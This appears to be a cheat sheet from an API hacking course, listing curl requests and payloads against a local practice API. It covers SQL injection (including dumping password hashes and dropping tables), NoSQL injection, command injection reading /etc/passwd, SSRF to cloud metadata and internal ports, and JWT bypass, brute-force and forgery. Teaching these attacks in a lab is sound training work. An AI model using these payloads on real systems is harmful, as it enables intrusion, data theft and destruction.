# 🗂️ Cheat Sheet — Stage 6: Advanced Attacks

## SQL Injection (users/search)

```bash
curl -s "http://localhost:5001/api/v1/users/search?q=%25%27%20OR%20%271%27%3D%271" \
  -H "Authorization: Bearer $TOKEN"

# Common payloads
' OR '1'='1
' UNION SELECT username,password_hash,email,role,1,1 FROM users--
'; DROP TABLE users;--   (lab only!)
```

## NoSQL-style Injection (tools/user-lookup)

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}}'          # returns ALL users

curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"role": {"$eq": "admin"}}'         # find admins
```

## Command Injection (tools/ping, tools/dns-lookup)

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; whoami"}'

curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1 && cat /etc/passwd"}'

# Common injection operators: ; | && || $() ``
```

## SSRF (upload/avatar, webhook/test)

```bash
curl -s -X POST http://localhost:5001/api/v1/upload/avatar \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'   # cloud metadata

curl -s -X POST http://localhost:5001/api/v1/upload/avatar \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5001/api/v1/debug"}'          # internal service scan

curl -s -X POST http://localhost:5001/api/v1/webhook/register \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:22"}'                          # internal port scan
```

## JWT Attacks

```python
# 1. Decode without verifying
import jwt
jwt.decode(token, options={"verify_signature": False})

# 2. Brute-force weak secret
import jwt
for secret in wordlist:
    try:
        jwt.decode(token, secret, algorithms=["HS256"])
        print("FOUND:", secret); break
    except jwt.InvalidSignatureError:
        pass

# 3. "none" algorithm bypass — see Stage 5 cheat sheet

# 4. Forge with known/leaked secret
forged = jwt.encode({"user_id": 1, "role": "admin", "exp": 9999999999}, secret, algorithm="HS256")
```

```bash
# hashcat / john against a JWT (offline secret brute force)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
```

---
*SocialHack API Hacking Course — Stage 6 Cheat Sheet*
